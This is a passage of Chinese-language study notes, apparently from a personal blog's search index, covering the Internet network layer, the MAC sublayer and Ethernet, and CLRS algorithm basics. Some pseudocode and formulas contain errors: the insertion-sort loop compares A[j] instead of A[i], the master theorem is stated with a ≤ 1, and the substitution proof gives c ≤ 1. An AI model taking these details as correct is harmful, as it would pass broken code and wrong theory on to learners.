网络互联\n\n### 何以连接网络\n\n- 网络互联基于共有网络层-IP\n\n### 隧道\n\n- 通过中间的网络连接两个网络\n    - 数据包被封装在中间\n\n### 数据包分段\n\n- 由于许多原因，网络具有不同的数据包大小限制\n    - 通过分段和重组发送的大数据包\n    - 透明分段，包在每个网络内分段/重组\n    - 非透明分段，包只在目的地重组\n- 路径MTU发现避免了网络分段\n- 路由器将MTU（最大传输单元）返回到源并丢弃大数据包\n\n## Internet的网络层\n\n### IPV4\n\n- IPV4报头包含20字节定长部分和一个可选的变长部分\n    - 版本：4位，记录数据包属于协议哪个版本\n    - IHL：4位，记录头部长度（以4字节长度为单位），最小值为5，最大值为15\n    - 区分服务：8位，前6位标记数据包的服务类别，后2位携带显示拥塞通知信息\n    - 总长度：16位，记录数据报总长度\n    - 标识：16位，用于标识数据报，同一个数据包的所有段包含同样的的标识符\n    - DF：1位，代表不分段标志位，1代表不分段\n    - MF：1位，代表更多的段标志位，0代表最后一段\n    - 分段偏移量：13位，指明了该段在当前数据报中的位置（以8字节长度为单位），除了数据报的最后一个段外，其他所有段的长度必须是8字节的倍数\n    - 生存期（TTL）：8位，用于限制数据包生存期的计数器，递减到0时数据包被丢弃，并向源主机发回报警包\n    - 协议：8位，记录上层协议，ICMP01，IGMP02，TCP06，UDP17，OSPF89\n    - 校验和：16位\n    - 源地址：32位，源IP地址\n    - 目标地址：32位，目标IP地址\n\n### IP地址\n\n- IPv4地址是一个32位地址，它唯一且地定义了设备到Internet的连接。\n- IPv4的地址空间是2^32\n\n#### 前缀\n\n- 地址以称为前缀的块分配\n- 前缀由网络部分确定\n- 书写格式：地址/长度，如18.0.31.0/24\n\n#### 分类和特殊寻址\n\n- 分类寻址中IP地址被分为5个类别\n    - A类，1.0.0.0-127.255.255.255/8\n    - B类，128.0.0.0-191.255.255.255/16\n    - C类，192.0.0.0-223.255.255.255/24\n    - D类，224.0.0.0-239.255.255.255（组播地址）\n    - E类，240.0.0.0-255.255.255.255（保留地址）\n- 特殊IP地址\n    - 0.0.0.0 主机\n    - 00...00|主机 本地网络主机\n    - 255.255.255.255 本地网络广播\n    - 网络|11...11 远程网络广播\n    - 127|任何内容 回环\n\n#### 子网\n\n- 在内部将一个网络块分成几个部分供多个内部网络使用，但对外部仍然像单个网络一样\n\n#### IP地址聚合\n\n- 聚合将多个IP前缀合并为一个较大的前缀，以减少路由表的大小\n\n#### 最长前缀匹配\n\n- 数据包被转发到具有最长匹配前缀或最小地址块的条目\n    - 使转发复杂化，但增加了灵活性\n\n#### NAT\n\n- NAT（网络地址转换）盒将一个外部IP地址映射到多个内部IP地址\n    - 使用TCP/UDP端口区分连接\n    - 违反分层原则；在家庭等中非常常见\n- 私有地址：\n    - 10.0.0.0-10.255.255.255/8\n    - 172.16.0.0-172.31.255.255/12\n    - 192.168.0.0-192.168.255.255/16\n\n### IPV6\n\n- IPv6的地址空间包含$2^{128}$个地址。这个地址空间是IPv4地址的$2^{96}$倍\n- IPv6报头40字节，并且更简单\n    - 版本：4位\n    - 区分服务：8位，用于区分数据包的服务类别，与IPV4相同\n    - 流标签：20位，为源端和接收方提供了一种建立伪连接的方式\n    - 有效载荷长度：16位\n    - 下一个头：8位，指明当前头之后还有哪种扩展头。如果当前头是最后一个头，则该字段指定了该数据包的上层协议（TCP/UDP）\n    - 跳数限制：8位，同IPV4\n    - 源地址：16字节\n    - 目标地址：16字节\n- 三种过渡策略：\n    - 双栈\n    - 隧道\n    - 头部翻译\n\n### Internet控制协议\n\n#### ICMP（Internet控制消息协议）\n\n- 处理错误和控制消息\n- 每一种消息被封装在IP包中\n- 如果路由器不能传递或转发数据包，它会向源发送一条ICMP“主机不可访问”消息\n- 若路由器接收到本应发送至另一路由器的数据包，则向发送方发送ICMP“重定向”消息；发送方修改其路由表\n- ICMP“路由器发现”消息允许主机了解其网络中的路由器，并初始化和更新其路由表\n- ICMP回送请求和回复有助于诊断并用于“ping”\n\n#### ARP（地址解析协议）\n\n- ARP允许节点从IP地址中查找目标以太网地址\n\n#### RARP（反向地址转换协议）\n\n- RARP允许局域网的物理机器从网关服务器的 ARP 表或者缓存上请求其 IP 地址\n- RARP request也是广播，没有目标地址；RARP reply也是有目标地址，也是单播\n\n#### DHCP（动态主机配置协议）\n\n- DHCP是一个应用层程序，使用客户机-服务器范例，实际上在网络层帮助TCP/IP\n- 客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码\n    - DHCP DISCOVER，客户端寻找DHCP服务器位置时所使用的报文\n    - DHCP OFFER，告知用户本服务器可以为其提供IP地址\n    - DHCP REQUEST，向该服务器发送一个广播的Request请求报文通告选择的服务器。希望获得所分配的IP地址\n    - DHCP ACK，发送ACK应答报文，通知用户可以使用分配的IP地址\n\n#### MPLS（多协议标签交换）\n\n- 一种在开放的通信网上利用标签引导数据高速、高效传输的新技术\n- MPLS介于IP网络层和链路层协议之间，有时被称为2.5层协议\n- MPLS沿着已建立的路径发送数据包\n- 在进入MPLS网络（如ISP）时根据IP地址添加标签，在离开时删除\n    - 转发仅在MPLS网络内使用标签\n\n#### OSPF/开放式最短路径优先（内部网关路由协议/IGP）\n\n- OSPF（Open Shortest Path First开放式最短路径优先）计算单个网络（如ISP）的路由\n    - 将网络建模为加权边图\n- OSPF将一个大型网络（自治系统）划分为连接到主干区域的区域\n    - 有助于扩大规模\n\n#### BGP/边界网关协议（外部网关路由协议/EGP）\n\n- BGP（边界网关协议）计算互连自治网络中的路由\n    - 关键作用是尊重网络的路由政策约束\n\n#### Internet组播\n\n- 组具有保留的IP地址范围（D类）\n- 通过协议（如PIM）计算的路由：\n    - 密集模式使用带剪枝的RPF(逆向路径转发树)\n    - 稀疏模式使用核心树(CBT)\n- IP组播除了在单个网络中（如数据中心、有线电视网络）外，没有得到广泛应用","tags":["计算机网络"],"categories":["计软杂谈","学习笔记"]},{"title":"计算机网络-介质访问控制子层 学习笔记","url":"/reimu-lighthouse/20230128/mac-layer/","content":"- 负责确定多路访问信道下一个使用者\n- 数据链路层的一个重要部分，特别是对于局域网\n\n## 信道分配问题\n\n- 用于来自N个用户的固定通道和流量\n    - 使用FDM、TDM、CDMA等划分带宽\n    - 这是一种静态分配，例如调频收音机\n    - 这种静态分配对于突发流量的性能很差\n    - 分配给用户的资源有时会被闲置\n- 动态分配在用户需要时为其提供通道\n    - 对于N个用户，效率可能是N倍\n\n### 动态信道分配的假设\n\n- 流量独立\n- 单信道\n- 冲突可观察\n- 时间连续或分槽\n- 载波侦听或不听\n\n## 多访问协议\n\n### ALOHA\n\n- 由夏威夷大学的Norm Abramson开发\n- 完全分散协议\n\n#### 纯ALOHA\n\n- 在纯ALOHA中，用户只要有数据就发送帧\n- 用户在发生冲突后选择随机的时间后重试\n    - 低负载下的高效低延迟\n- 当其他用户在两倍于帧时间的脆弱时段内传输时，会发生冲突\n- 将发送端与时间槽同步可以减少冲突\n    - 帧时间：帧长度除以比特率\n- 吞吐量$S = G \\times e^ {(-2G)}$\n- 最大吞吐量出现在$G = 0.5，S = 1/2e = 18.4\\%$\n\n#### 分槽ALOHA\n\n- 分槽ALOHA的效率是纯ALOHA的两倍\n- 低负载浪费时间槽，高负载导致碰撞\n- 吞吐量$S = G \\times e^ {(-G)}$\n- 最大吞吐量出现在$G = 1，S = 1/e = 36.8\\%$\n\n### CSMA\n\n- CSMA通过感知信道改进了ALOHA\n    - 如果用户感觉到其他人，则不会发送\n    - “先感知后传输”或“先听后说”的原则\n- 1-坚持CSMA持续侦听，一有空闲立即发送\n- 非坚持CSMA如果侦听存在载波，则等待随机时间，然后重复上述步骤，会带来更大延迟，但有更好的信道利用率\n- p-坚持CSMA试用与分时间槽的信道。如果侦听时信道空闲，则按概率p发送数据，概率1-p推迟到下一个时间槽，如果发生冲突，则等待随机时间，然后重复上述步骤\n\n#### 带冲突检测的CSMA\n\n- CSMA/CD的改进是检测/中止冲突\n- 减少竞争时间以提高性能\n- 一个站在发送帧后监听介质，以查看传输是否成功\n    - 如果是这样的话，这个站就结束了\n    - 如果发生碰撞，将立即终止发送，随机等待一段时间后帧将再次发送\n- 一个站传输了2τ后没有监听到冲突，则可以确保自己抓住了信道（τ为两个相距最远的站传播信号所需要的时间）\n\n### 无冲突协议\n\n- 无冲突协议完全避免冲突\n- 发送方必须知道何时轮到他们发送\n\n#### 位图协议\n\n- 如果发送方有数据，则在竞争槽中设置一位\n- 发送者依次发送；每个人都知道谁有数据\n\n#### 令牌传递\n\n- 令牌发送环定义发送顺序\n    - 具有令牌的站点可以在通过之前发送帧\n    - 也可以在没有环的情况下使用，例如令牌总线\n\n#### 二进制倒计数\n\n- 二进制倒计数改进了位图协议\n- 站点在争用插槽中以二进制位串的形式广播自己的地址\n- 异或这些位；站点在发送“0”但异或结果为“1”时放弃\n\n### 有限竞争协议\n\n- 在低负载下采用竞争的做法而提供较短的延迟，而在高负载下采用无冲突技术，从而获得良好的信道效率\n- 将站分成几组，其中只有很少一部分可能想要发送\n    - 避免因空闲时间和冲突而造成的浪费\n\n#### 自适应树遍历协议\n\n- 树将站点分成组（节点）进行轮询\n    - 深度优先搜索具有冲突的节点下的树\n    - 如果>1个站点，则在较低层开始搜索\n\n### 无线局域网协议\n\n- 与有线相比，无线具有复杂性\n- 节点可能具有不同的覆盖区域，这导致了隐藏终端和暴露终端\n- 节点无法检测冲突，即发送时无法感知冲突，这使碰撞变得昂贵且必须避免\n\n#### 隐藏终端\n\n- 隐藏终端是发送方，它们不能相互感知，但会在预期的接收方处发生碰撞\n\n#### 暴露终端\n\n- 暴露终端是能够相互感知但仍能安全传输（到不同接收器）的发送方\n\n#### 冲突避免多路访问（MACA）\n\n- MACA协议授予A发送给B的访问权：\n    - A向B发送RTS；B回复CTS\n    - A可以使用暴露但不隐藏的终端进行发送\n\n## 以太网\n\n### 经典以太网\n\n- 一条共享同轴电缆，所有主机都连接到该电缆\n- 高达10 Mbps，采用曼彻斯特编码\n- 主机运行经典的以太网协议进行访问\n- MAC协议是1-persistent CSMA/CD（早期）\n- 使用BEB（二进制指数后退的CSMA/CA）计算碰撞后的随机延迟（后退）\n- 帧格式仍然用于现代以太网\n    - DIX 前导码+目标地址+源地址+类型+数据+填充+校验和\n    - IEEE802.3 前导码（SOF）+目标地址+源地址+长度+数据+填充+校验和\n    - 最大数据长度1500字节，最小数据长度46字节（帧最小数据长度64字节，为了有效冲突检测）\n\n#### BEB\n\n- 在第i次冲突后，从0-2^i-1之间选择一个随机数，等待这么多的时间槽\n- 达到10次冲突后，随机数的选择区间被固定在1023\n- 16次冲突后，放弃努力并返回一个失败报告\n\n#### 单播/组播/多播\n\n- 要找到地址的类型，我们需要查看左边的第二个十六进制数字\n    - 如果是偶数，则地址为单播\n    - 如果是奇数，则地址为多播\n    - 如果所有数字都是F，则为广播地址\n\n#### 性能\n\n- 适用于大帧，即使有多个发送者\n- 小帧（和长局域网）性能下降\n\n### 交换式以太网\n\n- 集线器将所有线路连接到单个CSMA/CD域中\n- 交换机将每个端口隔离到单独的域\n    - 多端口的吞吐量要大得多\n    - 无需使用带有全双工线路的CSMA/CD\n\n### 快速以太网\n\n- 快速以太网扩展以太网，从10 Mbps扩展到100 Mbps\n    - MAC子层保持不变\n    - 为了保持帧的最小大小，网络电缆的最大长度应缩短10倍\n    - 双绞线（5类）占据市场\n\n### 千兆/10千兆以太网\n\n- 在计算机/交换机之间使用全双工线路\n- 地址长度、帧格式以及最大和最小帧长度保持不变。\n- 为了实现1 Gbps的数据速率，这不再可能保持MAC子层不变\n- 千兆以太网有两种不同的介质访问方法：\n    - **半双工**：与集线器一起使用。需要CSMA/CD。最大距离是传统以太网（2500m）的1/100倍（2500m->25m）\n    - **全双工**：“正常”模式。用于中央交换机。所有的线路具有缓冲能力。没有竞争，无需CSMA/CD\n- 增加半径的两个标准功能：\n    - **载波扩充（carrier extension）**：告诉硬件在正常帧（64字节）后添加自己的填充，以将帧扩展到512字节\n    - **帧突发（frame bursting）**：允许发送方在一次传输中传输多个帧的串联序列\n- 这两个功能将网络的半径扩展到200米\n\n## 无线局域网\n\n### 802.11体系结构和协议栈\n\n- 无线客户端与有线AP（接入点）关联\n    - 这被称为基础设施模式；也有没有AP的自组织模式，较罕见\n- MAC用于不同的物理层\n\n### 802.11物理层\n\n- 网卡与多个物理层兼容\n    - 例如802.11 a/b/g\n\n### 802.11MAC子层\n\n- CSMA/CA插入后退槽以避免冲突\n- MAC对无线错误使用ACK/重传\n\n### 802.11帧结构\n\n- 帧因其类型而异（帧控制）\n- 数据帧有3个地址要通过AP传递\n\n## 数据链路层交换\n\n### 学习网桥\n\n- 后向学习算法选择输出端口：\n    - 将帧上的源地址与输入端口关联\n    - 带有目标地址的帧被送到已经学习过的端口\n    - 未学习的目的地将发送到所有其他端口（泛洪算法）\n\n### 生成树网桥\n\n- 具有循环和只有反向学习的桥接拓扑将导致帧永远循环\n    - 需要支持生成树来解决问题\n- 数据转发端口的子集用于避免循环\n- 使用Perlman生成算法选择Perlman生成树\n\n### 虚拟局域网\n\n- VLAN（虚拟LAN）将一个物理LAN拆分为多个逻辑LAN，以简化管理任务\n    - 端口根据其VLAN“着色”","tags":["计算机网络"],"categories":["计软杂谈","学习笔记"]},{"title":"算法导论 学习笔记","url":"/reimu-lighthouse/20221229/clrs-book-note/","content":"## 基础知识\n### 算法基础\n#### 增量方法\n##### 插入排序\n```text\nINSERTION-SORT(A)\nfor j = 2 to A.length\n    key = A[j]\n    i = j - 1\n    while i > 0 and A[j] > key\n        A[i + 1] = A[i]\n        i = i - 1\n    A[i + 1] = key\n```\n##### 循环不变式\n循环不变式主要用来帮助我们理解算法的正确性。关于循环不变式，我们必须证明三条性质：  \n- **初始化**：循环的第一次迭代之前，它为真\n- **保持**：如果循环的某次迭代之前它为真，那么下次迭代之前它仍然为真\n- **终止**：在循环终止时，不变式为我们提供一个有用的性质，该性质有助于证明算法是正确的\n#### 分治法\n分治法的思想：将原问题分解为几个规模较小但类似于原问题的子问题，递归地求解这些子问题，然后再合并这些子问题的解来建立原问题的解\n分治模式在每层递归时都有三个步骤：\n- **分解**原问题为若干子问题，这些子问题是原问题的规模较小的实例\n- **解决**这些子问题，递归地求解各子问题。然而，若子问题的规模足够小，则直接求解\n- **合并**这些子问题的解成原问题的解\n##### 归并排序\n- **分解**：分解待排序的n个元素的序列成各具n/2个元素的两个子序列\n- **解决**：使用归并排序递归地排序两个子序列\n- **合并**：合并两个已排序的子序列以产生已排序的答案\n\n我们通过调用一个辅助过程 `MERGE(A, p, q, r)` 来完成合并，其中$A$是一个数组， $p$、$q$和$r$是数组下标，满足$p \\leq q < r$。该过程假设子数组$A[p..q]$和$A[q+1..r]$都已排好序\n过程 `MERGE` 需要$\\Theta(n)$的时间，其中$n=r-p+1$是带合并元素的总数\n```text\nMERGE(A, p, q, r)\nn1 = q - p + 1\nn2 = r - q\nlet L[1..n1 + 1] and R[1..n2 + 1] be new arrays\nfor i = 1 to n1\n    L[i] = A[p + i - 1]\nfor j = 1 to n2\n    R[j] = A[q + j]\nL[n1 + 1] = ∞\nR[n2 + 1] = ∞\ni = 1\nj = 1\nfor k = p to r\n    if L[i] <= R[j]\n        A[k] = L[i]\n        i = i + 1\n    else \n        A[k] = R[j]\n        j = j + 1\n```\n```text\nMERGE-SORT(A, p, r)\nif p < r\n    q = ⌊(p + r)/2⌋\n    MERGE-SORT(A, p, q)\n    MERGE-SORT(A, q+1, r)\n    MERGE(A, p, q, r)\n```\n##### 分析分治算法\n假设$T(n)$是规模为$n$的一个问题的运行时间：\n- 若问题规模足够小，则直接求解需要常量时间$\\Theta(1)$\n- 假设把原问题分解为$a$个子问题，每个子问题的规模是原问题的$1/b$。为了求解一个规模为$n/b$的子问题，需要$T(n/b)$的时间，所以需要$aT(n/b)$的时间来求解$a$个子问题\n- 分解问题成子问题需时间$D(n)$\n- 合并子问题的解成原问题的解需时间$C(n)$\n\n那么得到递归式：\n$$\nT(n) =\n\\begin{cases}\n\\Theta(1) \\qquad & n \\leq c \\\\\naT(n/b)+D(n)+C(n) \\qquad & other\n\\end{cases}\n$$\n\n对于归并排序，其最坏情况运行时间$T(n)$的递归式：\n$$\nT(n) =\n\\begin{cases}\n\\Theta(1) \\qquad & n = 1 \\\\\n2T(n/2)+\\Theta(n) \\qquad &  n>1\n\\end{cases} = \\Theta(nlgn)\n$$\n### 函数增长\n#### 渐进记号\n##### $\\Theta$记号\n对于一个给定的函数$g(n)$，用$\\Theta(g(n))$来表示以下函数的集合：  \n$\\Theta(g(n))=\\{f(n):\\text{存在正常量}c_1\\text{、}c_2\\text{和}n_0\\text{，使得对所有}n \\geq n_0\\text{，有}0\\leq c_1g(n) \\leq f(n) \\leq c_2g(n)\\}$\n\n![$\\Theta$](https://d-sketon.top/img/clrs-book/1.png)\n\n我们称$g(n)$是$f(n)$的一个**渐进紧确界**\n##### $O$记号\n对于一个给定的函数$g(n)$，用$O(g(n))$来表示以下函数的集合：  \n$O(g(n))=\\{f(n):\\text{存在正常量}c\\text{和}n_0\\text{，使得对所有}n \\geq n_0\\text{，有}0\\leq f(n) \\leq cg(n)\\}$\n\n![$O$](https://d-sketon.top/img/clrs-book/2.png)\n\n\n我们称$g(n)$是$f(n)$的一个**渐进上界**\n##### $\\Omega$记号\n对于一个给定的函数$g(n)$，用$\\Omega(g(n))$来表示以下函数的集合：  \n$\\Omega(g(n))=\\{f(n):\\text{存在正常量}c\\text{和}n_0\\text{，使得对所有}n \\geq n_0\\text{，有}0\\leq cg(n) \\leq f(n)\\}$\n\n![$\\Omega$](https://d-sketon.top/img/clrs-book/3.png)\n\n我们称$g(n)$是$f(n)$的一个**渐进下界**\n##### $o$记号\n对于一个给定的函数$g(n)$，用$o(g(n))$来表示以下函数的集合：  \n$o(g(n))=\\{f(n):\\text{存在正常量}c\\text{和}n_0\\text{，使得对所有}n \\geq n_0\\text{，有}0\\leq f(n) < cg(n)\\}$\n我们称$g(n)$是$f(n)$的一个**非渐进紧确上界**\n##### $\\omega$记号\n对于一个给定的函数$g(n)$，用$\\omega(g(n))$来表示以下函数的集合：  \n$\\omega(g(n))=\\{f(n):\\text{存在正常量}c\\text{和}n_0\\text{，使得对所有}n \\geq n_0\\text{，有}0\\leq cg(n) < f(n)\\}$\n我们称$g(n)$是$f(n)$的一个**非渐进紧确下界**\n##### 比较各种函数\n- 传递性\n$f(n) = \\Theta(g(n)) \\land g(n) = \\Theta(h(n)) \\rightarrow f(n) = \\Theta(h(n))$\n$f(n) = O(g(n)) \\land g(n) = O(h(n)) \\rightarrow f(n) = O(h(n))$\n$f(n) = \\Omega(g(n)) \\land g(n) = \\Omega(h(n)) \\rightarrow f(n) = \\Omega(h(n))$\n$f(n) = o(g(n)) \\land g(n) = o(h(n)) \\rightarrow f(n) = o(h(n))$\n$f(n) = \\omega(g(n)) \\land g(n) = \\omega(h(n)) \\rightarrow f(n) = \\omega(h(n))$\n- 自反性\n$f(n) = \\Theta(f(n))$\n$f(n) = O(f(n))$\n$f(n) = \\Omega(f(n))$\n- 对称性\n$f(n) = \\Theta(g(n)) \\leftrightarrow g(n) = \\Theta(f(n))$\n- 转置对称性\n$f(n) = O(g(n)) \\leftrightarrow g(n) = \\Omega(f(n))$\n$f(n) = o(g(n)) \\leftrightarrow g(n) = \\omega(f(n))$\n- 类比\n$f(n) = O(g(n)) \\rightarrow a \\leq b$\n$f(n) = \\Omega(g(n)) \\rightarrow a \\geq b$\n$f(n) = \\Theta(g(n)) \\rightarrow a = b$\n$f(n) = o(g(n)) \\rightarrow a < b$\n$f(n) = \\omega(g(n)) \\rightarrow a > b$\n#### 标准记号与常用函数\n##### 多项式\n对于一个$d$次渐进正的多项式$p(n)$，有：\n$$p(n)=\\Theta(n^d)$$\n##### 指数\n任意底大于1的指数函数比任意多项式函数增长得快：\n$$n^b = o(a^n),a>1$$\n##### 对数\n对所有实数$a>0$，$b>0$，$c>0$和$n$，有：\n$$a = b^{log_b a}$$\n\n$$log_c(ab) = log_c a + log_c b$$\n\n$$log_b a^n = n log_b a$$\n\n$$log_b a = \\frac{log_c a}{log_c b}$$\n\n$$log_b(1/a) = -log_b a$$\n\n$$log_b a = \\frac{1}{log_a b}$$\n\n$$a^{log_b c} = c^{log_b a}$$\n\n任意正的多项式函数都比任意多底数函数增长得快：\n$$lg^b n = o(n^a)$$\n##### 阶乘\n**斯特林近似公式**：\n$$n!=\\sqrt{2\\pi n}(\\frac{n}{e})^n(1+\\Theta(\\frac{1}{n}))$$\n\n$$n!=\\sqrt{2\\pi n}(\\frac{n}{e})^n e^{a_n}, \\frac{1}{12n+1}<a_n<\\frac{1}{12n}$$\n\n给出了一个更紧确的上界和下界：\n$$n!=o(n^n)$$\n\n$$n!=\\omega(2^n)$$\n\n$$lg(n!)=\\Theta(nlgn)$$\n##### 多重函数\n假设$f(n)$为实数集上的一个函数，对非负整数$i$，我们递归地定义：\n$$\nf^{(i)}(n) =\n\\begin{cases}\nn \\qquad & i = 1 \\\\\nf(f^{(i-1)}(n)) \\qquad &  i>1\n\\end{cases}\n$$\n##### 多重对数函数\n定义多重对数函数为：\n$$lg*n=min\\{i \\geq 0:lg^{(i)}n \\leq 1\\}$$\n\n多重对数是一个增长**非常慢**的函数:\n- $lg*2=1$\n- $lg*4=2$\n- $lg*16=3$\n- $lg*65536=4$\n- $lg*(2^{65536})=5$\n### 分治策略\n- **代入法**：我们猜测一个界，然后用数学归纳法证明这个界是正确的\n- **递归树法**：将递归式转换为一棵树，其结点表示不同层次的递归调用产生的代价。然后采用边界和技术来求解递归式\n- **主方法**：可求解形如下面公式的递归式的界：\n$$T(n)=aT(n/b)+f(n),a\\geq 1,b>1$$\n#### 最大子数组问题\n寻找A的和最大的非空连续子数组，这样的连续子数组为**最大子数组**\n##### 使用分治策略的求解方法\n$A[low..high]$的任何连续子数组$A[i..j]$所处的位置必然是一下三种情况之一：\n- 完全位于子数组$A[low..mid]$中，因此$low \\leq i \\leq j \\leq mid$\n- 完全位于子数组$A[mid+1..high]$中，因此$mid < i \\leq j \\leq high$\n- 跨越了中点，因此$low \\leq i \\leq mid < j \\leq high$\n\n过程 `FIND-MAX-CROSSING-SUBARRAY(A, low, mid, high)` 接收数组$A$和下标$low$，$mid$和$high$为输入，返回一个下标元组划定跨越中点的最大子数组的边界，并返回最大子数组中值的和：\n```text\nFIND-MAX-CROSSING-SUBARRAY(A, low, mid, high)\nleft-sum = -∞\nsum = 0\nfor i = mid downto low\n    sum = sum + A[i]\n    if sum > left-sum\n        left-sum = sum\n        max-left = i\nright-sum = -∞\nsum = 0\nfor j = mid + 1 to high\n    sum = sum + A[j]\n    if sum > right-sum\n        right-sum = sum\n        max-right = j\nreturn (max-left, max-right, left-sum + right-sum)\n```\n```text\nFIND-MAXINUM-SUBARRAY(A, low, high)\nif high == low\n    return (low, high, A[low])\nelse mid = ⌊(low + high)/2⌋\n    (left-low, right-high, left-sum) = FIND-MAXINUM-SUBARRAY(A, low, mid)\n    (right-low, right-high, right-sum) = FIND-MAXINUM-SUBARRAY(A, mid+1, high)\n    (cross-low, cross-high, cross-zum) = FIND-MAX-CROSSING-SUBARRAY(A, low, mid, high)\n    if left-sum >= right-sum and left-sum >= cross-sum\n        return (left-low, left-high, left-sum)\n    elseif right-sum >= left-sum and right-sum >= cross-sum\n        return (right-low, right-high, right-sum)\n    else return (cross-low, cross-high, cross-sum)\n```\n##### 分治算法的分析\n`FIND-MAXINUM-SUBARRAY` 运行时间$T(n)$的递归式：\n$$\nT(n) =\n\\begin{cases}\n\\Theta(1) \\qquad & n = 1 \\\\\n2T(n/2) + \\Theta(n) \\qquad &  n>1\n\\end{cases} = \\Theta(nlgn)\n$$\n#### 矩阵乘法的Strassen算法\n##### 基础的矩阵乘法\n复杂度 $\\Theta (n^3)$\n```text\nSQUARE-MATRIX-MULTIPLY(A, B)\nn = A.rows\nlet C be a new n * n matrix\nfor i = 1 to n\n    for j = 1 to n\n        c_ij = 0\n        for k = 1 to n\n            c_ij = c_ij + a_ik * b_kj\nreturn C\n```\n##### 简单的分治算法\n假定将$A$，$B$和$C$均分解为4个$n/2 \\times n/2$的子矩阵：\n$$\nA = \\begin{bmatrix}\nA_{11} & A_{12} \\\\\nA_{21} & A_{22}\n\\end{bmatrix}\n,\nB = \\begin{bmatrix}\nB_{11} & B_{12} \\\\\nB_{21} & B_{22}\n\\end{bmatrix}\n,\nC = \\begin{bmatrix}\nC_{11} & C_{12} \\\\\nC_{21} & C_{22}\n\\end{bmatrix}\n$$\n\n可以将公式$C = A \\cdot B$改写为：\n$$\n\\begin{bmatrix}\nC_{11} & C_{12} \\\\\nC_{21} & C_{22}\n\\end{bmatrix} = \n\\begin{bmatrix}\nA_{11} & A_{12} \\\\\nA_{21} & A_{22}\n\\end{bmatrix} \\cdot\n\\begin{bmatrix}\nB_{11} & B_{12} \\\\\nB_{21} & B_{22}\n\\end{bmatrix}\n$$\n```text\nSQUARE-MATRIX-MULTIPLY-RECURSIVE(A, B)\nn = A.rows\nlet C be a new n * n matrix\nif n == 1\n    c_11 = a_11 * b_11\nelse partition A, B and C as in equations \n    C_11 = SQUARE-MATRIX-MULTIPLY-RECURSIVE(A_11, B_11) + SQUARE-MATRIX-MULTIPLY-RECURSIVE(A_12, B_21)\n    C_12 = SQUARE-MATRIX-MULTIPLY-RECURSIVE(A_11, B_12) + SQUARE-MATRIX-MULTIPLY-RECURSIVE(A_12, B_22)\n    C_21 = SQUARE-MATRIX-MULTIPLY-RECURSIVE(A_21, B_11) + SQUARE-MATRIX-MULTIPLY-RECURSIVE(A_22, B_21)\n    C_22 = SQUARE-MATRIX-MULTIPLY-RECURSIVE(A_21, B_12) + SQUARE-MATRIX-MULTIPLY-RECURSIVE(A_22, B_22)\n```\n`SQUARE-MATRIX-MULTIPLY-RECURSIVE` 运行时间$T(n)$的递归式：\n$$\nT(n) =\n\\begin{cases}\n\\Theta(1) \\qquad & n = 1 \\\\\n8T(n/2) + \\Theta(n^2) \\qquad &  n>1\n\\end{cases} = \\Theta(n^3)\n$$\n##### Strassen方法\n`Strassen`运行时间$T(n)$的递归式：\n$$\nT(n) =\n\\begin{cases}\n\\Theta(1) \\qquad & n = 1 \\\\\n7T(n/2) + \\Theta(n^2) \\qquad &  n>1\n\\end{cases} = \\Theta(n^{lg_7})\n$$\n#### 代入法求解递归式\n**代入法**求解递归式分为两步：\n- 猜测解的形式\n- 用数学归纳法求出解的常数，并证明解是正确的\n\n例如，确定下列递归式的上界：\n$$T(n)=2T(\\lfloor n/2 \\rfloor)+n$$\n猜测其解为$T(n)=O(nlgn)$\n首先假定次上界对所有正数$m<n$都成立，特别对于$m=\\lfloor n/2 \\rfloor$，有$T(\\lfloor n/2 \\rfloor) \\leq c\\lfloor n/2 \\rfloor lg(\\lfloor n/2 \\rfloor)$。将其带入递归式，有：\n\n$T(n) \\leq 2(c\\lfloor n/2 \\rfloor lg(\\lfloor n/2 \\rfloor)) + n \\leq cn lg(n/2) + n \\\\\n= cnlgn-cnlg2+n\\\\\n=cnlgn-cn+n\\\\\n\\leq cnlgn$\n其中，只要$c \\leq 1$，最后一步都会成立\n#### 递归树求解递归式\n在**递归树**中，每个结点表示一个单一子问题的代价，子问题对应某次递归函数调用\n我们将树中的每层中的代价求和，得到每层代价，然后将所有层的代价求和，得到所有层次的递归调用的总代价\n#### 主方法求解递归式\n令$a\\leq 1$和$b>1$是常数，$f(n)$是一个函数，$T(n)$是定义在非负整数上的递归式：\n$$T(n)=aT(n/b)+f(n)$$\n\n- 若对某个常数$\\epsilon >0$有$f(n)=O(n^{log_ba-\\epsilon})$，则$T(n)=\\Theta(n^{log_ba})$\n- 若对于某个常数$k\\geq 0$有$f(n)=\\Theta(n^{log_ba}lg^kn)$，则$T(n)=\\Theta(n^{log_ba}lg^{k+1}n)$\n- 若对某个常数$\\epsilon >0$有$f(n)=\\Omega(n^{log_ba+\\epsilon})$，且对某个常数$c<1$和所有足够大的$n$有$af(n/b) \\leq cf(n)$，则$T(n)=\\Theta(f(n))$\n### 随机算法\n#### 雇佣问题\n```text\nHIRE-ASSISTANT(n)\nbest = 0\nfor i = 1 to n\n    interview candidate i\n    if candidate i is better than candidate best\n        best = i\n        hire candidate i\n```\n##### 最坏情况分析\n在最坏情况下，当应聘者质量按出现的次序严格递增时，总费用是$O(c_hn)$\n##### 随机算法\n如果一个算法的行为不仅由输入决定，而且也由**随机数生成器**产生的数值决定，则称这个算法是**随机的**\n#### 指示器随机变量\n给定一个样本空间$S$和一个事件$A$，那么事件$A$对应的**指示器随机变量**$I\\{A\\}$定义为：\n$$\nI\\{A\\} =\n\\begin{cases}\n1 \\qquad & if\\  A \\ occurs \\\\\n0 \\qquad &  if \\  A \\ does\\  not\\  occur\n\\end{cases}\n$$\n\n给定一个样本空间$S$和$S$中的一个事件$A$，设$X_A=I\\{A\\}$，那么$E[X_A]=Pr\\{A\\}$\n##### 用指示器随机变量分析雇佣问题\n应聘者$i$比应聘者1到$i-1$更有资格的概率为$1/i$\n$E[X_i]=1/i$\n所以有：\n$E[X]\\\\\n=E[\\sum_{i=i}^n X_i]\\\\\n= \\sum_{i=1}^nE[X_i]\\\\\n=\\sum_{i=1}^n1/i\\\\\n=lnn+O(1)\n$\n算法 `HIRE-ASSISTANT` 总的雇佣费用平均情形下为$O(c_hlnn)$\n#### 随机算法\n过程 `RANDOMIZED-HIRE-ASSISTANT` 的雇佣费用期望是$O(c_hlnn)$：\n```text\nRANDOMIZED-HIRE-ASSISTANT(n)\nrandomly permute the list of candidates\nbest = 0\nfor i = 1 to n\n    interview candidate i\n    if candidate i is better than candidate best\n        best = i\n        hire candidate i\n```\n##### 随机排列数组\n假设所有优先级都不同，则过程 